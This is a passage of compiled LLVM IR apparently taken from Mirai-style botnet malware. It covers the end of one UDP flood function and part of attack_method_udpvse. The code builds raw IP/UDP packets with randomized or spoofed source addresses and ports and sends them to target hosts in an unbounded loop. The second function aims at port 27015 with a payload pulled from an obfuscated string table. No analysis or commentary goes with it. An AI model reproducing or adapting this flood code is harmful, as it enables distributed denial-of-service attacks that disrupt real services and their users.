  %79 = call i32 @setsockopt(i32 noundef %77, i32 noundef 0, i32 noundef 3, i8* noundef %78, i32 noundef 4) #7
  %80 = icmp eq i32 %79, -1
  br i1 %80, label %81, label %84

81:                                               ; preds = %76
  %82 = load i32, i32* %10, align 4
  %83 = call i32 @close(i32 noundef %82)
  br label %312

84:                                               ; preds = %76
  store i32 0, i32* %9, align 4
  br label %85

85:                                               ; preds = %167, %84
  %86 = load i32, i32* %9, align 4
  %87 = load i8, i8* %5, align 1
  %88 = zext i8 %87 to i32
  %89 = icmp slt i32 %86, %88
  br i1 %89, label %90, label %170

90:                                               ; preds = %85
  %91 = call noalias i8* @calloc(i64 noundef 1510, i64 noundef 1) #7
  %92 = load i8**, i8*** %11, align 8
  %93 = load i32, i32* %9, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i8*, i8** %92, i64 %94
  store i8* %91, i8** %95, align 8
  %96 = load i8**, i8*** %11, align 8
  %97 = load i32, i32* %9, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds i8*, i8** %96, i64 %98
  %100 = load i8*, i8** %99, align 8
  %101 = bitcast i8* %100 to %struct.iphdr*
  store %struct.iphdr* %101, %struct.iphdr** %21, align 8
  %102 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %103 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %102, i64 1
  %104 = bitcast %struct.iphdr* %103 to %struct.udphdr*
  store %struct.udphdr* %104, %struct.udphdr** %22, align 8
  %105 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %106 = bitcast %struct.iphdr* %105 to i8*
  %107 = load i8, i8* %106, align 4
  %108 = and i8 %107, 15
  %109 = or i8 %108, 64
  store i8 %109, i8* %106, align 4
  %110 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %111 = bitcast %struct.iphdr* %110 to i8*
  %112 = load i8, i8* %111, align 4
  %113 = and i8 %112, -16
  %114 = or i8 %113, 5
  store i8 %114, i8* %111, align 4
  %115 = load i8, i8* %12, align 1
  %116 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %117 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %116, i32 0, i32 1
  store i8 %115, i8* %117, align 1
  %118 = load i16, i16* %18, align 2
  %119 = zext i16 %118 to i64
  %120 = add i64 28, %119
  %121 = trunc i64 %120 to i16
  %122 = call zeroext i16 @htons(i16 noundef zeroext %121) #8
  %123 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %124 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %123, i32 0, i32 2
  store i16 %122, i16* %124, align 2
  %125 = load i16, i16* %13, align 2
  %126 = call zeroext i16 @htons(i16 noundef zeroext %125) #8
  %127 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %128 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %127, i32 0, i32 3
  store i16 %126, i16* %128, align 4
  %129 = load i8, i8* %14, align 1
  %130 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %131 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %130, i32 0, i32 5
  store i8 %129, i8* %131, align 4
  %132 = load i8, i8* %15, align 1
  %133 = icmp ne i8 %132, 0
  br i1 %133, label %134, label %138

134:                                              ; preds = %90
  %135 = call zeroext i16 @htons(i16 noundef zeroext 16384) #8
  %136 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %137 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %136, i32 0, i32 4
  store i16 %135, i16* %137, align 2
  br label %138

138:                                              ; preds = %134, %90
  %139 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %140 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %139, i32 0, i32 6
  store i8 17, i8* %140, align 1
  %141 = load i32, i32* %20, align 4
  %142 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %143 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %142, i32 0, i32 8
  store i32 %141, i32* %143, align 4
  %144 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %145 = load i32, i32* %9, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %144, i64 %146
  %148 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %147, i32 0, i32 1
  %149 = load i32, i32* %148, align 4
  %150 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %151 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %150, i32 0, i32 9
  store i32 %149, i32* %151, align 4
  %152 = load i16, i16* %16, align 2
  %153 = call zeroext i16 @htons(i16 noundef zeroext %152) #8
  %154 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %155 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %154, i32 0, i32 0
  store i16 %153, i16* %155, align 2
  %156 = load i16, i16* %17, align 2
  %157 = call zeroext i16 @htons(i16 noundef zeroext %156) #8
  %158 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %159 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %158, i32 0, i32 1
  store i16 %157, i16* %159, align 2
  %160 = load i16, i16* %18, align 2
  %161 = zext i16 %160 to i64
  %162 = add i64 8, %161
  %163 = trunc i64 %162 to i16
  %164 = call zeroext i16 @htons(i16 noundef zeroext %163) #8
  %165 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %166 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %165, i32 0, i32 2
  store i16 %164, i16* %166, align 2
  br label %167

167:                                              ; preds = %138
  %168 = load i32, i32* %9, align 4
  %169 = add nsw i32 %168, 1
  store i32 %169, i32* %9, align 4
  br label %85, !llvm.loop !27

170:                                              ; preds = %85
  br label %171

171:                                              ; preds = %311, %170
  store i32 0, i32* %9, align 4
  br label %172

172:                                              ; preds = %308, %171
  %173 = load i32, i32* %9, align 4
  %174 = load i8, i8* %5, align 1
  %175 = zext i8 %174 to i32
  %176 = icmp slt i32 %173, %175
  br i1 %176, label %177, label %311

177:                                              ; preds = %172
  %178 = load i8**, i8*** %11, align 8
  %179 = load i32, i32* %9, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds i8*, i8** %178, i64 %180
  %182 = load i8*, i8** %181, align 8
  store i8* %182, i8** %23, align 8
  %183 = load i8*, i8** %23, align 8
  %184 = bitcast i8* %183 to %struct.iphdr*
  store %struct.iphdr* %184, %struct.iphdr** %24, align 8
  %185 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %186 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %185, i64 1
  %187 = bitcast %struct.iphdr* %186 to %struct.udphdr*
  store %struct.udphdr* %187, %struct.udphdr** %25, align 8
  %188 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %189 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %188, i64 1
  %190 = bitcast %struct.udphdr* %189 to i8*
  store i8* %190, i8** %26, align 8
  %191 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %192 = load i32, i32* %9, align 4
  %193 = sext i32 %192 to i64
  %194 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %191, i64 %193
  %195 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %194, i32 0, i32 2
  %196 = load i8, i8* %195, align 4
  %197 = zext i8 %196 to i32
  %198 = icmp slt i32 %197, 32
  br i1 %198, label %199, label %220

199:                                              ; preds = %177
  %200 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %201 = load i32, i32* %9, align 4
  %202 = sext i32 %201 to i64
  %203 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %200, i64 %202
  %204 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %203, i32 0, i32 1
  %205 = load i32, i32* %204, align 4
  %206 = call i32 @ntohl(i32 noundef %205) #8
  %207 = call i32 @rand_next()
  %208 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %209 = load i32, i32* %9, align 4
  %210 = sext i32 %209 to i64
  %211 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %208, i64 %210
  %212 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %211, i32 0, i32 2
  %213 = load i8, i8* %212, align 4
  %214 = zext i8 %213 to i32
  %215 = lshr i32 %207, %214
  %216 = add i32 %206, %215
  %217 = call i32 @htonl(i32 noundef %216) #8
  %218 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %219 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %218, i32 0, i32 9
  store i32 %217, i32* %219, align 4
  br label %220

220:                                              ; preds = %199, %177
  %221 = load i32, i32* %20, align 4
  %222 = icmp eq i32 %221, -1
  br i1 %222, label %223, label %227

223:                                              ; preds = %220
  %224 = call i32 @rand_next()
  %225 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %226 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %225, i32 0, i32 8
  store i32 %224, i32* %226, align 4
  br label %227

227:                                              ; preds = %223, %220
  %228 = load i16, i16* %13, align 2
  %229 = zext i16 %228 to i32
  %230 = icmp eq i32 %229, 65535
  br i1 %230, label %231, label %236

231:                                              ; preds = %227
  %232 = call i32 @rand_next()
  %233 = trunc i32 %232 to i16
  %234 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %235 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %234, i32 0, i32 3
  store i16 %233, i16* %235, align 4
  br label %236

236:                                              ; preds = %231, %227
  %237 = load i16, i16* %16, align 2
  %238 = zext i16 %237 to i32
  %239 = icmp eq i32 %238, 65535
  br i1 %239, label %240, label %245

240:                                              ; preds = %236
  %241 = call i32 @rand_next()
  %242 = trunc i32 %241 to i16
  %243 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %244 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %243, i32 0, i32 0
  store i16 %242, i16* %244, align 2
  br label %245

245:                                              ; preds = %240, %236
  %246 = load i16, i16* %17, align 2
  %247 = zext i16 %246 to i32
  %248 = icmp eq i32 %247, 65535
  br i1 %248, label %249, label %254

249:                                              ; preds = %245
  %250 = call i32 @rand_next()
  %251 = trunc i32 %250 to i16
  %252 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %253 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %252, i32 0, i32 1
  store i16 %251, i16* %253, align 2
  br label %254

254:                                              ; preds = %249, %245
  %255 = load i8, i8* %19, align 1
  %256 = icmp ne i8 %255, 0
  br i1 %256, label %257, label %261

257:                                              ; preds = %254
  %258 = load i8*, i8** %26, align 8
  %259 = load i16, i16* %18, align 2
  %260 = zext i16 %259 to i32
  call void @rand_str(i8* noundef %258, i32 noundef %260)
  br label %261

261:                                              ; preds = %257, %254
  %262 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %263 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %262, i32 0, i32 7
  store i16 0, i16* %263, align 2
  %264 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %265 = bitcast %struct.iphdr* %264 to i16*
  %266 = call zeroext i16 @checksum_generic(i16* noundef %265, i32 noundef 20)
  %267 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %268 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %267, i32 0, i32 7
  store i16 %266, i16* %268, align 2
  %269 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %270 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %269, i32 0, i32 3
  store i16 0, i16* %270, align 2
  %271 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %272 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %273 = bitcast %struct.udphdr* %272 to i8*
  %274 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %275 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %274, i32 0, i32 2
  %276 = load i16, i16* %275, align 2
  %277 = load i16, i16* %18, align 2
  %278 = zext i16 %277 to i64
  %279 = add i64 8, %278
  %280 = trunc i64 %279 to i32
  %281 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* noundef %271, i8* noundef %273, i16 noundef zeroext %276, i32 noundef %280)
  %282 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %283 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %282, i32 0, i32 3
  store i16 %281, i16* %283, align 2
  %284 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %285 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %284, i32 0, i32 1
  %286 = load i16, i16* %285, align 2
  %287 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %288 = load i32, i32* %9, align 4
  %289 = sext i32 %288 to i64
  %290 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %287, i64 %289
  %291 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %290, i32 0, i32 0
  %292 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %291, i32 0, i32 1
  store i16 %286, i16* %292, align 2
  %293 = load i32, i32* %10, align 4
  %294 = load i8*, i8** %23, align 8
  %295 = load i16, i16* %18, align 2
  %296 = zext i16 %295 to i64
  %297 = add i64 28, %296
  %298 = bitcast %union.__CONST_SOCKADDR_ARG* %27 to %struct.sockaddr**
  %299 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %300 = load i32, i32* %9, align 4
  %301 = sext i32 %300 to i64
  %302 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %299, i64 %301
  %303 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %302, i32 0, i32 0
  %304 = bitcast %struct.sockaddr_in* %303 to %struct.sockaddr*
  store %struct.sockaddr* %304, %struct.sockaddr** %298, align 8
  %305 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %27, i32 0, i32 0
  %306 = load %struct.sockaddr*, %struct.sockaddr** %305, align 8
  %307 = call i64 @sendto(i32 noundef %293, i8* noundef %294, i64 noundef %297, i32 noundef 16384, %struct.sockaddr* %306, i32 noundef 16)
  br label %308

308:                                              ; preds = %261
  %309 = load i32, i32* %9, align 4
  %310 = add nsw i32 %309, 1
  store i32 %310, i32* %9, align 4
  br label %172, !llvm.loop !28

311:                                              ; preds = %172
  br label %171

312:                                              ; preds = %81, %75
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_method_udpvse(i8 noundef zeroext %0, %struct.attack_target* noundef %1, i8 noundef zeroext %2, %struct.attack_option* noundef %3) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i8*, align 8
  %19 = alloca i32, align 4
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 noundef %28, i64 noundef 8) #7
  %30 = bitcast i8* %29 to i8**
  store i8** %30, i8*** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 noundef zeroext %31, %struct.attack_option* noundef %32, i8 noundef zeroext 2, i32 noundef 0)
  %34 = trunc i32 %33 to i8
  store i8 %34, i8* %12, align 1
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 noundef zeroext %35, %struct.attack_option* noundef %36, i8 noundef zeroext 3, i32 noundef 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 noundef zeroext %39, %struct.attack_option* noundef %40, i8 noundef zeroext 4, i32 noundef 64)
  %42 = trunc i32 %41 to i8
  store i8 %42, i8* %14, align 1
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 noundef zeroext %43, %struct.attack_option* noundef %44, i8 noundef zeroext 5, i32 noundef 0)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = load i8, i8* %7, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %49 = call i32 @attack_get_opt_int(i8 noundef zeroext %47, %struct.attack_option* noundef %48, i8 noundef zeroext 6, i32 noundef 65535)
  %50 = trunc i32 %49 to i16
  store i16 %50, i16* %16, align 2
  %51 = load i8, i8* %7, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %53 = call i32 @attack_get_opt_int(i8 noundef zeroext %51, %struct.attack_option* noundef %52, i8 noundef zeroext 7, i32 noundef 27015)
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %17, align 2
  call void @table_unlock_val(i8 noundef zeroext 20)
  %55 = call i8* @table_retrieve_val(i32 noundef 20, i32* noundef %19)
  store i8* %55, i8** %18, align 8
  %56 = call i32 @socket(i32 noundef 2, i32 noundef 3, i32 noundef 17) #7
  store i32 %56, i32* %10, align 4
  %57 = icmp eq i32 %56, -1
  br i1 %57, label %58, label %59

58:                                               ; preds = %4
  br label %288

59:                                               ; preds = %4
  store i32 1, i32* %9, align 4
  %60 = load i32, i32* %10, align 4
  %61 = bitcast i32* %9 to i8*
  %62 = call i32 @setsockopt(i32 noundef %60, i32 noundef 0, i32 noundef 3, i8* noundef %61, i32 noundef 4) #7
  %63 = icmp eq i32 %62, -1
  br i1 %63, label %64, label %67

64:                                               ; preds = %59
  %65 = load i32, i32* %10, align 4
  %66 = call i32 @close(i32 noundef %65)
  br label %288

67:                                               ; preds = %59
  store i32 0, i32* %9, align 4
  br label %68

68:                                               ; preds = %160, %67
  %69 = load i32, i32* %9, align 4
  %70 = load i8, i8* %5, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp slt i32 %69, %71
  br i1 %72, label %73, label %163

73:                                               ; preds = %68
  %74 = call noalias i8* @calloc(i64 noundef 128, i64 noundef 1) #7
  %75 = load i8**, i8*** %11, align 8
  %76 = load i32, i32* %9, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8*, i8** %75, i64 %77
  store i8* %74, i8** %78, align 8
  %79 = load i8**, i8*** %11, align 8
  %80 = load i32, i32* %9, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds i8*, i8** %79, i64 %81
  %83 = load i8*, i8** %82, align 8
  %84 = bitcast i8* %83 to %struct.iphdr*
  store %struct.iphdr* %84, %struct.iphdr** %20, align 8
  %85 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %86 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %85, i64 1
  %87 = bitcast %struct.iphdr* %86 to %struct.udphdr*
  store %struct.udphdr* %87, %struct.udphdr** %21, align 8
  %88 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %89 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %88, i64 1
  %90 = bitcast %struct.udphdr* %89 to i8*
  store i8* %90, i8** %22, align 8
  %91 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %92 = bitcast %struct.iphdr* %91 to i8*
  %93 = load i8, i8* %92, align 4
  %94 = and i8 %93, 15
  %95 = or i8 %94, 64
  store i8 %95, i8* %92, align 4
  %96 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %97 = bitcast %struct.iphdr* %96 to i8*
  %98 = load i8, i8* %97, align 4
  %99 = and i8 %98, -16
  %100 = or i8 %99, 5
  store i8 %100, i8* %97, align 4
  %101 = load i8, i8* %12, align 1
  %102 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %103 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %102, i32 0, i32 1
  store i8 %101, i8* %103, align 1
  %104 = load i32, i32* %19, align 4
  %105 = sext i32 %104 to i64
  %106 = add i64 32, %105
  %107 = trunc i64 %106 to i16
  %108 = call zeroext i16 @htons(i16 noundef zeroext %107) #8
  %109 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %110 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %109, i32 0, i32 2
  store i16 %108, i16* %110, align 2
  %111 = load i16, i16* %13, align 2
  %112 = call zeroext i16 @htons(i16 noundef zeroext %111) #8
  %113 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %114 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %113, i32 0, i32 3
  store i16 %112, i16* %114, align 4
  %115 = load i8, i8* %14, align 1
  %116 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %117 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %116, i32 0, i32 5
  store i8 %115, i8* %117, align 4
  %118 = load i8, i8* %15, align 1
  %119 = icmp ne i8 %118, 0
  br i1 %119, label %120, label %124

120:                                              ; preds = %73
  %121 = call zeroext i16 @htons(i16 noundef zeroext 16384) #8
  %122 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %123 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %122, i32 0, i32 4
  store i16 %121, i16* %123, align 2
  br label %124

124:                                              ; preds = %120, %73
  %125 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i32 0, i32 6
  store i8 17, i8* %126, align 1
  %127 = load i32, i32* @LOCAL_ADDR, align 4
  %128 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %129 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %128, i32 0, i32 8
  store i32 %127, i32* %129, align 4
  %130 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %131 = load i32, i32* %9, align 4
  %132 = sext i32 %131 to i64
  %133 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %130, i64 %132
  %134 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %133, i32 0, i32 1
  %135 = load i32, i32* %134, align 4
  %136 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %137 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %136, i32 0, i32 9
  store i32 %135, i32* %137, align 4
  %138 = load i16, i16* %16, align 2
  %139 = call zeroext i16 @htons(i16 noundef zeroext %138) #8
  %140 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %141 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %140, i32 0, i32 0
  store i16 %139, i16* %141, align 2
  %142 = load i16, i16* %17, align 2
  %143 = call zeroext i16 @htons(i16 noundef zeroext %142) #8
  %144 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %145 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %144, i32 0, i32 1
  store i16 %143, i16* %145, align 2
  %146 = load i32, i32* %19, align 4
  %147 = sext i32 %146 to i64
  %148 = add i64 12, %147
  %149 = trunc i64 %148 to i16
  %150 = call zeroext i16 @htons(i16 noundef zeroext %149) #8
  %151 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %152 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %151, i32 0, i32 2
  store i16 %150, i16* %152, align 2
  %153 = load i8*, i8** %22, align 8
  %154 = bitcast i8* %153 to i32*
  store i32 -1, i32* %154, align 4
  %155 = load i8*, i8** %22, align 8
  %156 = getelementptr inbounds i8, i8* %155, i64 4
  store i8* %156, i8** %22, align 8
  %157 = load i8*, i8** %22, align 8
  %158 = load i8*, i8** %18, align 8
  %159 = load i32, i32* %19, align 4
  call void @util_memcpy(i8* noundef %157, i8* noundef %158, i32 noundef %159)
  br label %160

160:                                              ; preds = %124
  %161 = load i32, i32* %9, align 4
  %162 = add nsw i32 %161, 1
  store i32 %162, i32* %9, align 4
  br label %68, !llvm.loop !29

163:                                              ; preds = %68
  br label %164

164:                                              ; preds = %287, %163
  store i32 0, i32* %9, align 4
  br label %165

165:                                              ; preds = %284, %164
  %166 = load i32, i32* %9, align 4
  %167 = load i8, i8* %5, align 1
  %168 = zext i8 %167 to i32
  %169 = icmp slt i32 %166, %168
  br i1 %169, label %170, label %287

170:                                              ; preds = %165
  %171 = load i8**, i8*** %11, align 8
  %172 = load i32, i32* %9, align 4
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds i8*, i8** %171, i64 %173
  %175 = load i8*, i8** %174, align 8
  store i8* %175, i8** %23, align 8
  %176 = load i8*, i8** %23, align 8
  %177 = bitcast i8* %176 to %struct.iphdr*
  store %struct.iphdr* %177, %struct.iphdr** %24, align 8
  %178 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %179 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %178, i64 1
  %180 = bitcast %struct.iphdr* %179 to %struct.udphdr*
  store %struct.udphdr* %180, %struct.udphdr** %25, align 8
  %181 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %182 = load i32, i32* %9, align 4
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %181, i64 %183
  %185 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %184, i32 0, i32 2
  %186 = load i8, i8* %185, align 4
  %187 = zext i8 %186 to i32
  %188 = icmp slt i32 %187, 32
  br i1 %188, label %189, label %210

189:                                              ; preds = %170
  %190 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %191 = load i32, i32* %9, align 4
  %192 = sext i32 %191 to i64
  %193 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %190, i64 %192
  %194 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %193, i32 0, i32 1
  %195 = load i32, i32* %194, align 4
  %196 = call i32 @ntohl(i32 noundef %195) #8
  %197 = call i32 @rand_next()
  %198 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %199 = load i32, i32* %9, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %198, i64 %200
  %202 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %201, i32 0, i32 2
  %203 = load i8, i8* %202, align 4
  %204 = zext i8 %203 to i32
  %205 = lshr i32 %197, %204
  %206 = add i32 %196, %205
  %207 = call i32 @htonl(i32 noundef %206) #8
  %208 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %209 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %208, i32 0, i32 9
  store i32 %207, i32* %209, align 4
  br label %210

210:                                              ; preds = %189, %170
  %211 = load i16, i16* %13, align 2
  %212 = zext i16 %211 to i32
  %213 = icmp eq i32 %212, 65535
  br i1 %213, label %214, label %219

214:                                              ; preds = %210
  %215 = call i32 @rand_next()
  %216 = trunc i32 %215 to i16
  %217 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %218 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %217, i32 0, i32 3
  store i16 %216, i16* %218, align 4
  br label %219

219:                                              ; preds = %214, %210
  %220 = load i16, i16* %16, align 2
  %221 = zext i16 %220 to i32
  %222 = icmp eq i32 %221, 65535
  br i1 %222, label %223, label %228

223:                                              ; preds = %219
  %224 = call i32 @rand_next()
  %225 = trunc i32 %224 to i16
  %226 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %227 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %226, i32 0, i32 0
  store i16 %225, i16* %227, align 2
  br label %228

228:                                              ; preds = %223, %219
  %229 = load i16, i16* %17, align 2
  %230 = zext i16 %229 to i32
  %231 = icmp eq i32 %230, 65535
  br i1 %231, label %232, label %237

232:                                              ; preds = %228
  %233 = call i32 @rand_next()
  %234 = trunc i32 %233 to i16
  %235 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %236 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %235, i32 0, i32 1
  store i16 %234, i16* %236, align 2
  br label %237

237:                                              ; preds = %232, %228
  %238 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %239 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %238, i32 0, i32 7
  store i16 0, i16* %239, align 2
  %240 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %241 = bitcast %struct.iphdr* %240 to i16*
  %242 = call zeroext i16 @checksum_generic(i16* noundef %241, i32 noundef 20)
  %243 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %244 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %243, i32 0, i32 7
  store i16 %242, i16* %244, align 2
  %245 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %246 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %245, i32 0, i32 3
  store i16 0, i16* %246, align 2
  %247 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %248 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %249 = bitcast %struct.udphdr* %248 to i8*
  %250 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %251 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %250, i32 0, i32 2
  %252 = load i16, i16* %251, align 2
  %253 = load i32, i32* %19, align 4
  %254 = sext i32 %253 to i64
  %255 = add i64 12, %254
  %256 = trunc i64 %255 to i32
